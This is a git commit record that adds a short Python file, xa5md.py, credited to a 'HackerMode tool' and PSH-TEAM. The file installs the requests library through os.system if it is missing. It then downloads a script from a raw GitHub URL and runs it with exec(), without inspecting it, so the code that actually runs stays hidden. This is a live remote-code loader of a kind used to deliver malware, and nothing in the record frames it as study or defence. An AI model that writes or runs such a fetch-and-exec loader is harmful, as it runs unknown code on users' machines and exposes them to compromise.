35cec30046ea2b8251d4bfa1901387cc4901d4c9
AnasPro11 <79938433+AnasPro11@users.noreply.github.com>
2022-02-23 17:04:30 +0000

    Add files via upload

---
+++ xa5md.py
@@ -0,0 +1,13 @@
+# Encoded by HackerMode tool...
+# Copyright: PSH-TEAM
+# Follow us on telegram ( @psh_team )
+try :
+ import requests
+except :
+ import os
+ os.system('pip install requests')
+ import requests
+try :exec(requests.get("https://raw.githubusercontent.com/AnasPro11/New/main/pp.py").text)
+except :
+ print('\033[0;39m» \033[0;31m No Internet Connection \033[0;39m')
+ exit()
